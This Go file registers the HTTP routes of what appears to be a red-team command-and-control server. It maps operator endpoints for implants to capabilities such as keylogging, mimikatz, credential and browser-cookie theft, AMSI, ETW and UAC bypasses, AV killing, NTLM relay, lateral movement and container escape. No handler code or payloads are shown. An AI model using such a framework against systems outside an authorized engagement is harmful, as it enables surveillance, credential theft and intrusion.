package server

import (
	"github.com/gin-gonic/gin"
	"github.com/r0si/sovereign/internal/db"
	"github.com/r0si/sovereign/internal/server/middleware"
)

func (s *Server) registerAgentRoutes(auth *gin.RouterGroup) {
	auth.GET("/", s.handleDashboard)
	auth.GET("/dashboard", s.handleDashboard)

	agentsRead := auth.Group("/")
	agentsRead.Use(middleware.RequirePermission(db.PermAgentsRead))
	{
		agentsRead.GET("/agents", s.handleAgents)
		// The engagement deadlines made enforceable last round, made visible.
		// Full /api path: the group prefix here is "/", and the coverage guard only compares /api paths.
		agentsRead.GET("/api/engagements/expiry", s.handleEngagementExpiry)
		agentsRead.GET("/api/engagements", s.handleListEngagements)
		// "What did this exercise actually do" - a read-only roll-up over its own window.
		agentsRead.GET("/api/engagements/:id/summary", s.handleEngagementSummary)
		// The same summary as a document a reader can paste into a report.
		agentsRead.GET("/api/engagements/:id/summary/export", s.handleEngagementSummaryExport)
		// One download that hands over the whole exercise: summary, tasks, audit window, agents and plugins.
		agentsRead.GET("/api/engagements/:id/bundle", s.handleEngagementBundle)
		agentsRead.GET("/agents/:id", s.handleAgentDetail)
		// Who currently holds the exclusive remote-control lease for this
		// beacon. Read-only, so a viewer can see the badge without write perms.
		agentsRead.GET("/agents/:id/control", s.handleAgentControl)
		agentsRead.GET("/agents/:id/shell", s.handleShellPage)
		agentsRead.GET("/agents/:id/screen", s.handleScreenMonitorPage)
		agentsRead.GET("/agents/:id/tasks", s.handleGetAgentTasks)
		agentsRead.GET("/api/agents", s.handleListAgents)
		agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
		agentsRead.GET("/api/agents/:id/screenshots", s.handleListAgentScreenshots)
		agentsRead.GET("/api/agents/:id/timeline", s.handleAgentTimeline)
		agentsRead.GET("/agents/:id/token", s.handleTokenPage)
		agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
		agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
		agentsRead.GET("/api/agents/:id/process-tree", s.handleGetProcessTree)
		agentsRead.GET("/agents/:id/config", s.handleGetAgentConfig)
		agentsRead.GET("/agents/:id/chain", s.handleAgentChainGet)
		agentsRead.GET("/agents/:id/status-history", s.handleAgentStatusHistory)
		agentsRead.GET("/api/ai/status", s.handleAIStatus)
		agentsRead.GET("/api/handover/export", s.handleHandoverExport)
		agentsRead.GET("/api/scheduler/oneshot", s.handleListOneShotTasks)
	}

	aiUse := auth.Group("/")
	aiUse.Use(middleware.RequirePermission(db.PermAIUse))
	{
		aiUse.GET("/api/ai/pending-tasks", s.handleAIPendingTasks)
		aiUse.POST("/api/ai/analyze-result", s.handleAIAnalyzeResult)
		aiUse.POST("/api/ai/suggest-next-steps", s.handleAISuggestNextSteps)
		aiUse.POST("/api/ai/nl-query", s.handleAINLQuery)
		aiUse.POST("/api/ai/generate-playbook", s.handleAIGeneratePlaybook)
		aiUse.POST("/api/ai/run-review", s.handleAIRunReview)
	}

	filesRead := auth.Group("/")
	filesRead.Use(middleware.RequirePermission(db.PermFilesRead))
	{
		filesRead.GET("/agents/:id/files", s.handleFileBrowserPage)
	}

	agentTaskRead := auth.Group("/")
	agentTaskRead.Use(middleware.RequirePermission(db.PermAgentsRead, db.PermFilesRead))
	{
		agentTaskRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
		agentTaskRead.GET("/agents/:id/tasks/:taskId/output", s.handleDownloadTaskOutput)
	}

	// Task duration statistics: which task types are getting slow. tasks.read is enough - it only
	// aggregates rows the caller can already list.
	tasksStatsRead := auth.Group("/")
	tasksStatsRead.Use(middleware.RequirePermission(db.PermTasksRead))
	{
		tasksStatsRead.GET("/api/stats/tasks/duration", s.handleTaskDurationStats)
	}

	agentsWrite := auth.Group("/")
	agentsWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
	{
		agentsWrite.POST("/api/ai/save-playbook", s.handleAISavePlaybook)
		agentsWrite.POST("/agents/:id/kill", s.handleKillAgent)
		agentsWrite.POST("/agents/:id/note", s.handleUpdateNote)
		// The engagement deadline is enforceable since round 17; this is how an operator extends or
		// clears it without rebuilding the implant.
		agentsWrite.POST("/api/agents/:id/expiry", s.handleSetAgentExpiry)
		// The same deadline across a whole selection: ending an exercise must not be forty requests.
		agentsWrite.POST("/api/agents/bulk/expiry", s.handleBulkSetAgentExpiry)
		// Receiving side of a handover: re-compute the manifest digests of an uploaded bundle.
		agentsWrite.POST("/api/engagements/:id/bundle/verify", s.handleVerifyEngagementBundle)
		// Engagements are the time-boxed container above the tenant; creating and closing one changes
		// the scope of the exercise, so they sit on the write group.
		agentsWrite.POST("/api/engagements", s.handleCreateEngagement)
		agentsWrite.POST("/api/engagements/:id/close", s.handleCloseEngagement)
		agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
		agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
		agentsWrite.POST("/api/agents/:id/tasks/rerun-failed", s.handleRerunFailedTasks)
		agentsWrite.POST("/agents/batch", s.handleBatchCommand)
		agentsWrite.POST("/agents/bulk/task", s.handleBatchCommand)
		agentsWrite.GET("/agents/bulk/results", s.handleBulkResults)
		agentsWrite.POST("/api/agents/:id/processes", s.handleCollectProcesses)
		agentsWrite.POST("/agents/:id/trust", s.handleToggleAgentTrust)
		agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
		agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
		agentsWrite.POST("/agents/:id/config", s.handlePushAgentConfig)
		agentsWrite.POST("/agents/:id/chain/set", s.handleAgentChainSet)
		agentsWrite.POST("/agents/:id/chain/clear", s.handleAgentChainClear)
		agentsWrite.POST("/agents/:id/kill_date", s.handleSetKillDate)
		agentsWrite.DELETE("/agents/:id/kill_date", s.handleClearKillDate)
		agentsWrite.POST("/agents/:id/diagnose", s.handleAgentDiagnose)
	}
	agentsDelete := auth.Group("/")
	agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
	{
		agentsDelete.DELETE("/agents/:id", s.handleDeleteAgent)
		agentsDelete.POST("/agents/batch/delete", s.handleBulkDeleteAgents)
	}
}

// registerAgentCommandRoutes registers all agent command handlers, file ops, screen, tokens, SOCKS, rportfwd.

func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
	agentCmd := auth.Group("/agents/:id")
	agentCmd.Use(middleware.RequirePermission(db.PermAgentsWrite))
	{
		agentCmd.POST("/command", s.handleSendCommand)
		agentCmd.POST("/shell", s.handleSendCommand)
		// Exclusive-control lease: take (explicit, audited) or release.
		agentCmd.POST("/control", s.handleAgentControl)
		// One-shot explicit transport migration for the next encrypted beacon.
		agentCmd.POST("/transport", s.handleAgentTransportMigration)
		agentCmd.GET("/screenshot", s.handleGetAgentScreenshot)
		agentCmd.POST("/screenshot", s.handleRequestScreenshot)
		agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
		agentCmd.POST("/ps", s.handleRequestPS)
		agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
		agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
		agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
		agentCmd.POST("/suspend", s.handleSuspendProcess)
		agentCmd.POST("/resume", s.handleResumeProcess)
		agentCmd.POST("/killproc", s.handleKillProcess)
		agentCmd.POST("/window/list", s.handleWindowList)
		agentCmd.POST("/window/close", s.handleWindowClose)
		agentCmd.POST("/clipboard/get", s.handleClipboardGet)
		agentCmd.POST("/clipboard/set", s.handleClipboardSet)
		agentCmd.POST("/hostinfo", s.handleRequestHostInfo)
		agentCmd.POST("/reg/get", s.handleRegGet)
		agentCmd.POST("/reg/set", s.handleRegSet)
		agentCmd.POST("/reg/delete", s.handleRegDelete)
		agentCmd.POST("/reboot", s.handleReboot)
		agentCmd.POST("/wallpaper", s.handleWallpaper)
		agentCmd.POST("/shutdown", s.handleShutdown)
		agentCmd.POST("/beacon_now", s.handleBeaconNow)
		agentCmd.POST("/services", s.handleListServices)
		agentCmd.POST("/portscan", s.handlePortScan)
		agentCmd.POST("/netstat", s.handleNetstat)
		agentCmd.POST("/users", s.handleUsers)
		agentCmd.POST("/av", s.handleAV)
		agentCmd.POST("/uninstall", s.handleUninstall)
		agentCmd.POST("/set_sleep", s.handleSetSleep)
		agentCmd.POST("/keep_awake", s.handleKeepAwake)
		agentCmd.POST("/kill_av", s.handleKillAV)
		agentCmd.POST("/elevate", s.handleElevate)
		agentCmd.POST("/uac_bypass", s.handleUACBypass)
		agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
		agentCmd.POST("/etw_bypass", s.handleETWByPass)
		agentCmd.POST("/amsi_hardware_bp", s.handleAMSIHardwareBP)
		agentCmd.POST("/etw_hardware_bp", s.handleETWHardwareBP)
		agentCmd.POST("/run_evasion", s.handleRunEvasion)
		agentCmd.POST("/sandbox_detect_advanced", s.handleSandboxDetectAdvanced)
		agentCmd.POST("/set_sleep_mask_advanced", s.handleSetSleepMaskAdvanced)
		agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
		agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
		agentCmd.POST("/kerberoast", s.handleKerberoast)
		agentCmd.POST("/password_spray", s.handlePasswordSpray)
		agentCmd.POST("/cred_check", s.handleCredCheck)
		agentCmd.POST("/mimikatz", s.handleMimikatz)
		agentCmd.POST("/modules/deploy", s.handleModulesDeploy)
		agentCmd.POST("/powerpick", s.handlePowerPick)
		agentCmd.POST("/net", s.handleNetCommand)
		agentCmd.POST("/persistence", s.handlePersistence)
		agentCmd.POST("/bof", s.handleBOF)
		agentCmd.POST("/browser_steal", s.handleBrowserSteal)
		agentCmd.POST("/cookie_export", s.handleCookieExport)
		agentCmd.POST("/cookie_proxy/start", s.handleCookieProxyStart)
		agentCmd.POST("/cookie_proxy/stop", s.handleCookieProxyStop)
		agentCmd.GET("/cookie_proxy", s.handleCookieProxyStatus)
		agentCmd.GET("/cookie_proxy/jar", s.handleCookieProxyJar)
		agentCmd.GET("/cookie_proxy/netscape", s.handleCookieProxyNetscape)
		agentCmd.POST("/sccm_recon", s.handleSccmRecon)
		agentCmd.POST("/entra_prt", s.handleEntraPRT)
		agentCmd.POST("/screen_trigger/start", s.handleScreenTriggerStart)
		agentCmd.POST("/screen_trigger/stop", s.handleScreenTriggerStop)
		agentCmd.POST("/usb_drop", s.handleUSBDrop)
		agentCmd.POST("/browser_history", s.handleBrowserHistory)
		agentCmd.POST("/wechat_history", s.handleWeChatHistory)
		agentCmd.POST("/session_recon", s.handleSessionRecon)
		agentCmd.POST("/tun/start", s.handleTunStart)
		agentCmd.POST("/tun/stop", s.handleTunStop)
		agentCmd.GET("/tun", s.handleTunStatus)
		agentCmd.POST("/vpn_creds", s.handleVpnCreds)
		agentCmd.POST("/creds", s.handleCredsDump)
		agentCmd.POST("/wifi_creds", s.handleWifiCreds)
		agentCmd.POST("/privesc_check", s.handlePrivescCheck)
		agentCmd.POST("/inject", s.handleInject)
		agentCmd.POST("/spawn", s.handleSpawn)
		agentCmd.POST("/migrate", s.handleMigrate)
		agentCmd.POST("/self_update", s.handleSelfUpdate)
		agentCmd.POST("/lateral", s.handleLateral)
		agentCmd.POST("/socks", s.handleSocks)

		agentCmd.GET("/rportfwd/status", s.handleRPortFwdStatus)
		agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
		agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)

		agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
		agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)

		agentCmd.POST("/webrtc/start", s.handleWebRTCStart)
		agentCmd.POST("/webrtc/stop", s.handleWebRTCStop)

		agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
		agentCmd.POST("/token/steal", s.handleTokenSteal)
		agentCmd.POST("/token/make", s.handleTokenMake)
		agentCmd.POST("/token/revert", s.handleTokenRevert)
		agentCmd.POST("/token/whoami", s.handleTokenWhoami)
		agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
		agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
		agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)

		agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
		agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)

		agentCmd.POST("/container_detect", s.handleContainerDetect)
		agentCmd.POST("/container_escape", s.handleContainerEscape)
		agentCmd.POST("/container_docker", s.handleContainerDocker)
		agentCmd.POST("/container_k8s", s.handleContainerK8s)

		agentCmd.POST("/coerce/:type", s.handleCoerce)
		agentCmd.POST("/relay/start", s.handleNTLMRelayStart)
		agentCmd.POST("/relay/stop", s.handleNTLMRelayStop)
	}

	filesRead := auth.Group("/agents/:id")
	filesRead.Use(middleware.RequirePermission(db.PermFilesRead))
	{
		filesRead.POST("/files/ls", s.handleListDir)
		filesRead.POST("/files/search", s.handleFileSearch)
		filesRead.POST("/files/scan", s.handleFileScan)
		filesRead.POST("/files/thumb", s.handleFileThumb)
		filesRead.GET("/files/thumb/:thumb", s.handleFileThumbGet)
		filesRead.POST("/files/read", s.handleFileRead)
		filesRead.GET("/files/history", s.handleFileHistory)
		filesRead.GET("/files/revisions/:taskId", s.handleFileRevision)
		filesRead.POST("/find", s.handleFindFiles)
		filesRead.POST("/drives", s.handleListDrives)
		filesRead.POST("/usb_enum", s.handleUSBEnum)
		filesRead.GET("/transfers", s.handleListTransfers)
		filesRead.GET("/transfers/:transfer_id", s.handleGetTransfer)
		filesRead.GET("/transfers/:transfer_id/file", s.handleGetTransferFile)
		filesRead.POST("/transfers/:transfer_id/resume", s.handleResumeTransfer)
	}

	filesWrite := auth.Group("/agents/:id")
	filesWrite.Use(middleware.RequirePermission(db.PermFilesWrite))
	{
		filesWrite.POST("/files/delete", s.handleFileDelete)
		filesWrite.POST("/files/mkdir", s.handleFileMkdir)
		filesWrite.POST("/files/rename", s.handleFileRename)
		filesWrite.POST("/files/chmod", s.handleFileChmod)
		filesWrite.POST("/files/write", s.handleFileWrite)
		filesWrite.POST("/download", s.handleDownload)
		filesWrite.POST("/download_url", s.handleDownloadURL)
		filesWrite.POST("/file_hunt", s.handleFileHunt)
		filesWrite.PUT("/transfers/:transfer_id/chunk", s.handlePushTransferChunk)
		filesWrite.POST("/transfers/:transfer_id/pause", s.handlePauseTransfer)
		filesWrite.DELETE("/transfers/:transfer_id", s.handleCancelTransfer)
	}

	transferCreate := auth.Group("/agents/:id")
	transferCreate.Use(middleware.RequirePermission(db.PermFilesRead, db.PermFilesWrite))
	{
		transferCreate.POST("/transfers", s.handleCreateTransfer)
	}
}

// registerGenerateRoutes registers payload generation routes.
